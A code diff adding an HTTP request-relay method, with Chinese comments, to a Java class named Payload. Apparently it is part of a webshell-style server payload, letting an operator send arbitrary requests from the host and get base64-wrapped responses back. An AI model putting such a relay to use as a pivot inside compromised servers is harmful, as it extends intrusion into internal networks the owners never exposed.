@@ -437,6 +437,103 @@ public class Payload {
         return map;
     }
 
+    public HashMap<String, Object> sendHttpRequest(
+        String url,
+        String method,
+        HashMap<String, String> headers,
+        HashMap<String, String> params,
+        String dataBase64
+    ) {
+        try {
+            // 构建完整URL，包含查询参数
+            StringBuilder urlBuilder = new StringBuilder(url);
+            if (params != null && !params.isEmpty()) {
+                urlBuilder.append('?');
+                boolean first = true;
+                for (Map.Entry<String, String> entry : params.entrySet()) {
+                    if (!first) {
+                        urlBuilder.append('&');
+                    }
+                    urlBuilder.append(URLEncoder.encode(entry.getKey(), "UTF-8"));
+                    urlBuilder.append('=');
+                    urlBuilder.append(URLEncoder.encode(entry.getValue(), "UTF-8"));
+                    first = false;
+                }
+            }
+            String fullUrl = urlBuilder.toString();
+            
+            // 创建HTTP连接
+            URL urlObj = new URL(fullUrl);
+            HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();
+            conn.setRequestMethod(method);
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(10000);
+            
+            // 设置请求头
+            if (headers != null) {
+                for (Map.Entry<String, String> entry : headers.entrySet()) {
+                    conn.setRequestProperty(entry.getKey(), entry.getValue());
+                }
+            }
+            
+            // 设置请求体
+            if (dataBase64 != null && !dataBase64.isEmpty()) {
+                byte[] data = base64Decode(dataBase64);
+                conn.setDoOutput(true);
+                conn.getOutputStream().write(data);
+                conn.getOutputStream().flush();
+                conn.getOutputStream().close();
+            }
+            
+            // 获取响应
+            int statusCode = conn.getResponseCode();
+            
+            // 读取响应头
+            HashMap<String, String> responseHeaders = new HashMap<>();
+            for (Map.Entry<String, List<String>> entry : conn.getHeaderFields().entrySet()) {
+                if (entry.getKey() != null) {
+                    responseHeaders.put(entry.getKey(), String.join(", ", entry.getValue()));
+                }
+            }
+            
+            // 读取响应体
+            InputStream inputStream;
+            if (statusCode >= 200 && statusCode < 300) {
+                inputStream = conn.getInputStream();
+            } else {
+                inputStream = conn.getErrorStream();
+            }
+            
+            byte[] responseBody;
+            if (inputStream != null) {
+                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+                byte[] data = new byte[1024];
+                int bytesRead;
+                while ((bytesRead = inputStream.read(data)) != -1) {
+                    buffer.write(data, 0, bytesRead);
+                }
+                responseBody = buffer.toByteArray();
+                inputStream.close();
+            } else {
+                responseBody = new byte[0];
+            }
+            
+            // 构建返回结果
+            HashMap<String, Object> result = new HashMap<>();
+            result.put("status_code", statusCode);
+            result.put("headers", responseHeaders);
+            result.put("body", base64Encode(responseBody));
+            
+            return result;
+        } catch (Exception e) {
+            HashMap<String, Object> errorResult = new HashMap<>();
+            errorResult.put("status_code", 0);
+            errorResult.put("headers", new HashMap<String, String>());
+            errorResult.put("body", base64Encode(e.toString().getBytes()));
+            return errorResult;
+        }
+    }
+
     public String action() throws UnsupportedEncodingException {
         HashMap<String, Object> map = new HashMap<>();
         map.put("code", 0);
